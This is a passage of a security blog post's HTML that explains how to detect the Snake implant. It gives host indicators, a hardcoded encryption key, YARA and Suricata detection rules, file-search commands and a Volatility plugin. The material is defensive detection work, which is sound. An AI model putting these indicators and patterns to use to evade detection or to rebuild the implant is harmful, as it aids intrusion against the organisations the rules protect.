&lt;p&gt;High degree of persistence – To achieve persistence Snake generally registers a service called &amp;ldquo;WerFaultSvc&amp;rdquo; that executes Snake&amp;rsquo;s WerFault.exe located in &amp;ldquo;%windows%\WinSxS\&amp;rdquo;, which decrypts Snake&amp;rsquo;s components and loads them into memory.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The fact that Snake is state sponsored also adds additional resourcing capability, motivation, persistence and potential impact, making this a particularly potent threat given Russian efforts to influence political processes, conduct espionage, and disrupt critical infrastructure.&lt;/p&gt;
&lt;h1&gt;How to detect Snake&lt;/h1&gt;&lt;p&gt;There are numerous threat hunting techniques that can be deployed to detect Snake. However, depending on the type of infrastructure or response mechanisms your organisation has in place, certain techniques may prove more or less effective.&lt;/p&gt;
&lt;p&gt;Here are some points to consider when prioritising how to detect Snake:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Host-Based Detection&lt;/strong&gt; - this type of detection is critical and should be performed regardless of the size of your enterprise. It is a high confidence set of rules, which are key to determining if any of Snake’s components are located on machines connected to the network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Network based detection&lt;/strong&gt; – these type of detection rules could be particularly useful for large scale identification of Snake communication protocols. Ideal for enterprises using intrusion detection systems or firewalls that support Suricata rules deployment.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Memory Analysis&lt;/strong&gt; – Another technique to identify Snake is to investigate memory and see if it is executing at known locations. The CSA provides a useful Volatility plugin to perform this analysis. Unfortunately, this is less scalable and more time consuming, however, security researchers are developing alternatives that can help automating the process at larger scale.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Other Detection Mechanisms and Sigma Rules&lt;/strong&gt; – Sigma rules and Yara rules are being constantly developed as we write and will help speed up and automate the process of hunting for the FSB’s malware. These can often be integrated in SOC/SIEM as well as IR tooling.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Purple Team and Atomic Test Cases&lt;/strong&gt; – A highly efficient way of identifying and covering the detection gaps in your estate is to utilise a purple team approach, leveraging Atomic Red Team test cases which are being developed specifically for this implant.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JUMPSEC have detailed a number of implementable threat hunting detections which at risk organisations may wish to implement here at JUMPSEC Labs. We recommend using a combination of these approaches to effectively mitigate the threat and remove any reliance on a single point of failure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JUMPSEC have not exhaustively detailed each known technique. Additional hunting tools and techniques&lt;/strong&gt; &lt;strong&gt;may continue to be developed and JUMPSEC is actively monitoring NCSC and CISA detections to identify&lt;/strong&gt; &lt;strong&gt;opportunities where IoCs or TTPs can be leveraged.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Host-Based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;host-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#host-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;While effective, host-based detections are not without shortcomings within certain environments.&lt;/p&gt;
&lt;p&gt;Host-based detections enable a high degree of confidence based on the totality of positive hits for host-based artifacts, however, many artifacts on the host are easily shifted to exist in a different location, or with a different name, as the files are fully encrypted and accurately identifying these files is difficult.&lt;/p&gt;
&lt;p&gt;To combat these limitations JUMPSEC advises that host-based detection is integration with further manual analysis of positive hits.&lt;/p&gt;
&lt;p&gt;Multiple Snake components can be detected running in the system using different Indicators of Compromise. For example, the Covert Store generated by the implant, can present the following hardcoded encryption key (not always, depending on the malware operator):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;And the same key can be retrieved from the following Windows Registry path when stored:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SECURITY\Policy\Secrets\n&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Furthermore, the following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EB 52 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 5B 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 3C 90 4D 53 44 4F 53&lt;/p&gt;
&lt;p&gt;EB 00 00 00 00 00 00 00&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry and searching for a file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores.&lt;/p&gt;
&lt;p&gt;Another component is the &lt;strong&gt;Registry Blob&lt;/strong&gt; which might appear in the Windows registry when searching for a value of at least 0x1000 bytes in size and a High entropy value of at least 7.9. However, it can typically be found using the following information when its values are left as default:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Unknown (RegBlob)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Registry Path:&lt;/strong&gt; HKLM\SOFTWARE\Classes\.wav\OpenWithProgId&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;Additionally, Snake’s Queue File can be located leveraging a file-system search with a Regular Expression together with searching for High Entropy files using the Yara Rule listed further below. Typically the Queue File can be found with the following information:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Name:&lt;/strong&gt; &amp;lt; RANDOM_GUID &amp;gt;.&amp;lt;RANDOM_GUID&amp;gt;.crmlog&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Path:&lt;/strong&gt; %windows\registration\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy, file attributes of hidden, system, and archive&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Snake Queue File&lt;/p&gt;
&lt;p&gt;The following Yara rule (named 1.yar) can be used in conjunction with the subsequently listed UNIX and PowerShell commands to detect instances of the Snake Queue FIle:&lt;/p&gt;
&lt;p&gt;1.yar&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule HighEntropy
{
    meta:
        description = &amp;#34;entropy rule&amp;#34;

    condition:
        math.entropy(0, filesize) &amp;gt;= 7.0
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;UNIX command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \
    &amp;#39;.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
  $_.FullName -match
  &amp;#39;(?i)/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog$&amp;#39;
} | ForEach-Object {
  yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Moreover, we can use the Yara rules with the last two components that might indicate the malware running on the host machine: comadmin and werfault.&lt;/p&gt;
&lt;p&gt;Comadmin can be detected using the following information and the previously mentioned Yara rule (1.yar):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; comadmin.dat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\system32\Com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Houses Snake’s kernel driver and the driver’s loader&lt;/p&gt;
&lt;p&gt;Leveraging the previously stated Yara rule (1.yar) we can use the following UNI or PowerShell commands:&lt;/p&gt;
&lt;p&gt;UNIX&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \
    &amp;#39;.*\/system32/Com/comadmin\.dat&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
    $_.FullName -match &amp;#39;(?i)/system32/Com/comadmin\.dat$&amp;#39;
} | ForEach-Object {
    yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On the other end, the Werfault executable can be retrieved due to its use of non-standard icon-size and by using the information and the Yara rule stated below:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Werfault.exe&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; Icon is different than that of a valid Windows Werfault.exe file&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Persistence mechanism&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule PeIconSizes
{
    meta:
        description = &amp;#34;werfault rule&amp;#34;

    condition:
        pe.is_pe 
        and 
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336)
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Several tools can be used for the above-mentioned rules. Often SOC/SIEM platforms offer capabilities to automate this process once a blueprint of the hunt has been developed and integrated.&lt;/p&gt;
&lt;p&gt;If you currently don&amp;rsquo;t have any detection and response tooling, we recommend deploying one of the excellent open-source tools available online (we regularly use &lt;a href=&#34;https://github.com/Velocidex/velociraptor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Velociraptor&lt;/a&gt;) to perform a hunt in your estate can integrate well with host-based hunting, allowing you to identify and respond to threats in conjunction with the techniques and rules mentioned above.&lt;/p&gt;
&lt;h2&gt;Network-based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;network-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#network-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Network-based detection enables high-confidence for large-scale (network-wide) detection of custom Snake communication protocols. However, there is low visibility of Snake implant operations and encrypted data in transit.  Snake http, http2, and tcp signatures also potentially produce false positives and Snake operators can easily change network-based signatures.&lt;/p&gt;
&lt;p&gt;To counteract this, JUMPSEC recommend implementing Suricata rules to your NIDS appliances the following rules will enable you to detect http, http2 and tcp communication as leveraged by the implant. Further details can also be found within the &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisory&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Snake http rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following RegEx can be used to build rules matching the http and http2 traffic contained within the HTTP header field.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;^[0-9A-Za-z]{10}[0-9A-Za-z/\&amp;#43;]{11}=&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Which can be used in a Suricata rule as follows:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/C&amp;#34;;\
    flow: established, to_server;\
    sid: 7; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/H&amp;#34;;\
    flow: established, to_server;\
    sid: 8; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake http2 rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http2-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http2-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For http2, the implant’s header is encoded using base62 with non-extraneous characters. The following RegEx should be able to identify matches of such a header:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;      ^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11}
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/C&amp;#34;;\
    flow: established, to_server;\
    sid: 9; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/H&amp;#34;;\
    flow: established, to_server;\
    sid: 10; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake tcp rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-tcp-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-tcp-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following rule helps capture the signature set during the client-to-server communication for tcp, which usually starts with “ustart”, as well as subsequent data flows that match the malware’s behaviour.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 12;\
    flow: established, to_server; flowbits: set, a8; flowbits: noalert;\
    sid: 1; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize:8;\
    flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\
    flowbits: set, a4; flowbits: noalert;\
    sid: 2; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\
    flowbits: set, b81; flowbits: noalert;\
    sid: 3; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 8; flow: established, to_client; flowbits: isset, b81;\
    flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\
    sid: 4; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\
    flowbits: set, b41; flowbits: noalert;\
    sid: 5; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 4; flow: established, to_client; flowbits: isset, b41;\
    flowbits: unset, b41;\
    sid: 6; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Memory Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;memory-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#memory-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Memory analysis also enables a high degree of detection confidence as memory provides the greatest level of visibility into Snake’s behaviour and artifacts. However, it has the potential to impact system stability, is difficult to scale, and can be a time-consuming process.&lt;/p&gt;
&lt;p&gt;The joint advisory suggests the following as the most effective approach to detect the implant on an infected host and it provides a script to be used alongside Volatility and a memory dump of the target infected machine.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# This plugin to identify the injected usermode component of Snake is based 
# on the malfind plugin released with Volatility3
#
# This file is Copyright 2019 Volatility Foundation and licensed under the 
# Volatility Software License 1.0
# which is available at https://www.volatilityfoundation.org/license/vsl-v1.0
import logging
from typing import Iterable, Tuple
from volatility3.framework import interfaces, symbols, exceptions, renderers
from volatility3.framework.configuration import requirements
from volatility3.framework.objects import utility
from volatility3.framework.renderers import format_hints
from volatility3.plugins.windows import pslist, vadinfo
vollog = logging.getLogger(__name__)
class snake(interfaces.plugins.PluginInterface):
    _required_framework_version = (2, 4, 0)
    
    @classmethod
    def get_requirements(cls):
        return [
            requirements.ModuleRequirement(name = &amp;#39;kernel&amp;#39;, 
            description = &amp;#39;Windows kernel&amp;#39;, 
            architectures = [&amp;#34;Intel32&amp;#34;, &amp;#34;Intel64&amp;#34;]),
            requirements.VersionRequirement(name = &amp;#39;pslist&amp;#39;, 
            component = pslist.PsList, version = (2, 0, 0)),
            requirements.VersionRequirement(name = &amp;#39;vadinfo&amp;#39;, 
            component = vadinfo.VadInfo, version = (2, 0, 0))]

    @classmethod
    def list_injections(
            cls, context: interfaces.context.ContextInterface, 
            kernel_layer_name: str, symbol_table: str,
            proc: interfaces.objects.ObjectInterface) -&amp;gt; Iterable[
            Tuple[interfaces.objects.ObjectInterface, bytes]]:
        proc_id = &amp;#34;Unknown&amp;#34;
        try:
            proc_id = proc.UniqueProcessId
            proc_layer_name = proc.add_process_layer()
        except exceptions.InvalidAddressException as excp:
            vollog.debug(&amp;#34;Process {}: invalid address {} in layer {}&amp;#34;.
            format(proc_id, excp.invalid_address, excp.layer_name))
            return
        proc_layer = context.layers[proc_layer_name]
        for vad in proc.get_vad_root().traverse():
            protection_string = vad.get_protection(vadinfo.VadInfo.
            protect_values(context, kernel_layer_name, symbol_table), 
            vadinfo.winnt_protections)
            if not &amp;#34;PAGE_EXECUTE_READWRITE&amp;#34; in protection_string:
                continue

            if (vad.get_private_memory() == 1
                    and vad.get_tag() == &amp;#34;VadS&amp;#34;) or (vad.get_private_memory() 
                    == 0 and protection_string != 
                    &amp;#34;PAGE_EXECUTE_WRITECOPY&amp;#34;):
                data = proc_layer.read(vad.get_start(), 
                vad.get_size(), pad = True)
                if data.find(b&amp;#39;\x4d\x5a&amp;#39;) != 0:
                    continue
                yield vad, data

    def _generator(self, procs):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        is_32bit_arch = not symbols.symbol_table_is_64bit(self.context, 
        kernel.symbol_table_name)
        for proc in procs:
            process_name = utility.array_to_string(proc.ImageFileName)
            for vad, data in self.list_injections(self.context, 
            kernel.layer_name, kernel.symbol_table_name, proc):
                strings_to_find = [b&amp;#39;\x25\x73\x23\x31&amp;#39;,b&amp;#39;\x25\x73\x23\x32&amp;#39;,
                b&amp;#39;\x25\x73\x23\x33&amp;#39;,b&amp;#39;\x25\x73\x23\x34&amp;#39;, 
                b&amp;#39;\x2e\x74\x6d\x70&amp;#39;, b&amp;#39;\x2e\x73\x61\x76&amp;#39;,
                b&amp;#39;\x2e\x75\x70\x64&amp;#39;]
                if not all(stringToFind in data for 
                stringToFind in strings_to_find):
                    continue
                yield (0, (proc.UniqueProcessId, process_name, 
                format_hints.Hex(vad.get_start()),
                           format_hints.Hex(vad.get_size()),
                           vad.get_protection(
                               vadinfo.VadInfo.protect_values(self.context, 
                kernel.layer_name, kernel.symbol_table_name), 
                vadinfo.winnt_protections)))
                return

    def run(self):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        return renderers.TreeGrid([(&amp;#34;PID&amp;#34;, int), (&amp;#34;Process&amp;#34;, str), 
        (&amp;#34;Address&amp;#34;, format_hints.Hex), (&amp;#34;Length&amp;#34;, format_hints.Hex), 
        (&amp;#34;Protection&amp;#34;, str)], self._generator(pslist.PsList.list_processes(
        context = self.context, layer_name = kernel.layer_name,  
        symbol_table = kernel.symbol_table_name)))&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
